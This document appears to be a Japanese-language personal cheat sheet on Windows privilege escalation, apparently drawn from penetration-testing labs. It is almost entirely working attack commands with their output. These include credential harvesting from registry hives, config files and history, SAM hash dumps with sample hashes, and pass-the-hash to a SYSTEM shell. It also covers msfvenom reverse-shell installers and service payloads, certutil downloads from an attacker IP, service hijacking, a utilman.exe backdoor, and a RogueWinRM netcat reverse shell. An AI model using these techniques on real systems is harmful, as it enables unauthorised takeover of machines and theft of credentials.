# 権限昇格

## 情報収集

```shell
# 後述の WES-NG のインプットにできるため、コピペで kali 上にファイル保存する
systeminfo
```

```shell
# 管理者としてプロンプト実行しないと表示されない権限もある
whoami /priv
whoami /groups
```

```shell
net user
net user <user>
```

```shell
ipconfig
arp -a
route print
netstat -ano
```

```shell
findstr /si password *.txt
```

```shell
sc query
sc query windefend
```

```shell
netsh firewall show state
```

```shell
meterpreter> run post/multi/recon/local_exploit_suggester
```

```shell
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token <domain\username>
```

```shell
# wget と同じ効果
certutil -urlcache -f http://<ip>/Potato.exe Potato.exe
```

```shell
# インストールされているソフトウェア情報を取得
wmic product get name,version,vendor
```

### hashdump

特権ユーザーのセッションが必要

```shell
msf6 post(windows/gather/hashdump) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/hashdump) > run

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::
```

無人インストールの初期セットアップ

```text
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

Powershell ヒストリー

```shell
# cmdで実行する場合
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# powershellで実行する場合
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

保存済み資格情報

```shell
# システムに保存されている資格情報を表示
cmdkey /list

# ローカルアカウントやドメインアカウントが含まれていた場合
# パスワード入力なしで cmd を実行できる
runas /savecred /user:<user> cmd.exe
runas /savecred /user:<DOMAIN>\<user> cmd.exe
```

IIS 構成

```text
場所は次のいずれか
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

データベース接続文字列
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

PuTTY が保存しているプロキシ資格情報

```shell
# SimonTatham は PuTTY 作者の名前のため固定
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

スケジュールタスク

```shell
# 一覧
schtasks

# 特定のタスク表示
schtasks /query /tn <task-name> /fo list /v
```

ファイルの権限確認

```shell
icacls <file-full-path>
```

AlwaysInstallElevated

```shell
# 前提として、この2つのレジストリが設定されている必要がある
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# インストーラ（リバースシェル）の作成
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o malicious.msi

# インストーラの実行
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## サービス

### 実行ファイル権限

```shell
# サービス構成のレジストリ
HKLM\SYSTEM\CurrentControlSet\Services\

# サービス照会で実行ファイルや実行ユーザー等を調べる
sc qc <service-name>

# 実行ファイルの権限を調べる（変更可能かどうか）
icacls <exe-path>

# サービスのペイロードを作成
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe-service -o rev-svc.exe
```

### 引用符

サービスの exe 設定が適切な引用符で囲まれていない場合

```text
例：
"C:Programs\example service\srv.exe" params
であれば問題ないが、

C:Programs\example service\srv.exe params
と設定されてある場合、

C:Programs\example.exe の方が、実行優先順位が高い
```

### サービス DALC

サービスの設定自体を変更できるか

```shell
# sysinternals
accesschk64.exe -qlc <service-name>

icacls C:\Users\attacker\rev-svc.exe /grant Everyone:F

sc.exe config <service-name> binPath= "C:\Users\attacker\rev-svc.exe" obj= LocalSystem
```

## 権限

悪用可能な権限のリスト  
https://github.com/gtworek/Priv2Admin

```powershell
# 付与されている権限
# 「管理者として実行」したプロンプトでしか表示されない権限がある
whoami /priv
```

### SeBackup, SeRestore 権限

管理者以外のユーザーがシステムのバックアップをできるようにするため、あらゆるファイルにアクセスできる。

#### SAM ハッシュと SYSTEM ハッシュをバックアップ

```powershell
# 管理者プロンプト
reg save hklm\sam C:\Users\<user>\sam.hive
reg save hklm\system C:\Users\<user>\system.hive
```

#### パスワードハッシュを取得

```shell
# kaliにファイルコピーした後
python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
[*] Cleaning up...
```

#### Pass-The-Hash 攻撃

```shell
python /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@<ip>

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.76.224.....
[*] Found writable share ADMIN$
[*] Uploading file kSBnIKcD.exe
[*] Opening SVCManager on 10.10.76.224.....
[*] Creating service zlkx on 10.10.76.224.....
[*] Starting service zlkx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### SeTakeOwnership 権限

ユーザーはファイルやレジストリ キーを含むシステム上のあらゆるオブジェクトの所有権を取得できる。

様々な方法が考えられるが、下記では utilman.exe を悪用する。utilman.exe は、ロック画面で簡単操作を提供するアプリで SYSTEM として実行される。

### SeImpersonatePrivilege 権限

https://github.com/BeichenDream/GodPotato

```sh
certutil -URLcache -split -f http://10.13.85.243:8000/GodPotato-NET4.exe GodPotato-NET4.exe

GodPotato-NET4.exe -cmd "cmd /c whoami"
```

#### 所有権を取得し、自分にフルアクセス権限を付ける

```powershell
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant <user>:F
```

utilman.exe を cmd.exe に置き換える

```shell
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

これで、ロック画面で「簡単操作」ボタンを押したら、System ユーザーでコマンドプロンプトが表示されるようになる。

### SeImpersonate, SeAssignPrimaryToken 権限

他のユーザーのセキュリティコンテキストでプロセスやスレッドを起動できる権限。（なりすまし）

#### 背景

ユーザー (権限のないユーザーを含む) が Windows で BITS サービスを開始するたびに、SYSTEM 権限を使用してポート 5985 への接続が自動的に作成される。ポート 5985 は通常、WinRM サービスに使用される。
何らかの理由で WinRM サービスが実行されていない場合、攻撃者はポート 5985 で偽の WinRM サービスを開始し、開始時に BITS サービスによって行われる認証の試行をキャッチできる。攻撃者が SeImpersonate 権限を持っている場合、接続ユーザー (SYSTEM) に代わって任意のコマンドを実行できるという理屈。

```powershell
# RogueWinRM を使用して、リバースシェル接続を確立できる
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <ip> <port>"
```

https://github.com/antonioCoco/RogueWinRM

## 自動収集ツール

### WES-NG

https://github.com/bitsadmin/wesng

ペイロードをターゲット上に保存せず、kali 上で実行できるため、ステルス性が高い

```shell
# データベース最新化
wes.py --update
```

```shell
# ターゲットで systeminfo を実行し、systeminfo.txt に保存後
$ wes.py systeminfo.txt
```

### WinPEAS

https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS

```shell
winpeas.exe > outputfile.txt
```

### PrivescCheck

https://github.com/itm4n/PrivescCheck

```powershell
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

### meterpreter がある場合

multi/recon/local_exploit_suggester モジュールを利用
